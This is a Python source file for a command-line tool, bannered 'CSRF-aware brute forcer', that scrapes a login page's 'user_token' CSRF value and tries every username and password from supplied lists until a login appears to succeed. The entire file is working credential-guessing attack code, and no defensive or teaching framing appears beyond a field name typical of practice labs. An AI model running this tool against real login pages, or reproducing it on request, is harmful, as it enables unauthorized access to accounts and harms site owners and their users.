#!/usr/bin/env python3
import requests
import re
import sys
import argparse
from time import sleep

def banner():
    print("""
    ╔═══════════════════════════════════════╗
    ║         CSRF-AWARE BRUTE FORCER       ║
    ║         (SIMPLE BRUTE for WEB)        ║
    ╚═══════════════════════════════════════╝
    """)

def brute_force_csrf(target_url, usernames, passwords, delay=1, verbose=False):
    print(f"[*] Target: {target_url}")
    print(f"[*] Usernames: {len(usernames)}")
    print(f"[*] Passwords: {len(passwords)}")
    print(f"[*] Delay: {delay}s between attempts")
    print(f"[*] Verbose: {verbose}")
    print("[*] Starting attack...\n")
    
    session = requests.Session()
    attempts = 0
    
    for username in usernames:
        for password in passwords:
            attempts += 1
            try:
                if verbose:
                    print(f"[*] Attempt {attempts}: Getting CSRF token...")
                
                # Get login page and extract CSRF token
                login_page = session.get(target_url)
                token_match = re.search(r"name='user_token' value='([^']+)'", login_page.text)
                
                if not token_match:
                    print("[-] Could not find CSRF token! Check the URL.")
                    return
                    
                csrf_token = token_match.group(1)
                
                if verbose:
                    print(f"[*] Using CSRF token: {csrf_token}")
                
                # Prepare login data
                login_data = {
                    'username': username,
                    'password': password,
                    'Login': 'Login',
                    'user_token': csrf_token
                }
                
                # Send login request
                response = session.post(target_url, data=login_data, allow_redirects=True)
                
                # Check for success
                if 'Login failed' not in response.text and 'Invalid username or password' not in response.text:
                    print(f"\n[+] SUCCESS! Credentials found!")
                    print(f"[+] Username: {username}")
                    print(f"[+] Password: {password}")
                    print(f"[+] Attempts: {attempts}")
                    print(f"[+] Response URL: {response.url}")
                    return True
                else:
                    if verbose:
                        print(f"[-] Attempt {attempts}: {username}:{password} - Failed")
                    else:
                        print(f"[-] {username}:{password} - Failed")
                        
                sleep(delay)
                
            except Exception as e:
                print(f"[!] Error with {username}:{password} - {e}")
                continue
    
    print(f"\n[-] Attack completed. No valid credentials found after {attempts} attempts.")
    return False

def main():
    banner()
    
    parser = argparse.ArgumentParser(description='CSRF-Aware Brute Force Tool')
    parser.add_argument('-l', '--user', required=False, help='Single username')
    parser.add_argument('-L', '--users', help='User-name file')
    parser.add_argument('-p', '--password', required=False, help='Single Password')
    parser.add_argument('-P', '--passwords', required=False, help='Password file')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://target.com/login.php)')
    parser.add_argument('-w', '--wait', type=float, default=1, help='Wait time between attempts (default: 1s)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Validate input combinations
    if not args.user and not args.users:
        print("[-] Error: You must specify either -l (single user) or -L (user file)")
        sys.exit(1)
        
    if not args.password and not args.passwords:
        print("[-] Error: You must specify either -p (single password) or -P (password file)")
        sys.exit(1)
    
    # Load usernames
    usernames = []
    if args.user:
        usernames = [args.user]
    elif args.users:
        try:
            with open(args.users, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Error: User file '{args.users}' not found!")
            sys.exit(1)
    
    # Load passwords
    passwords = []
    if args.password:
        passwords = [args.password]
    elif args.passwords:
        try:
            with open(args.passwords, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Error: Password file '{args.passwords}' not found!")
            sys.exit(1)
    
    print(f"[*] Starting CSRF-aware brute force attack...")
    print(f"[*] Total combinations: {len(usernames) * len(passwords)}")
    print(f"[*] Wait time: {args.wait}s")
    print("")
    
    brute_force_csrf(args.url, usernames, passwords, args.wait, args.verbose)

if __name__ == "__main__":
    main()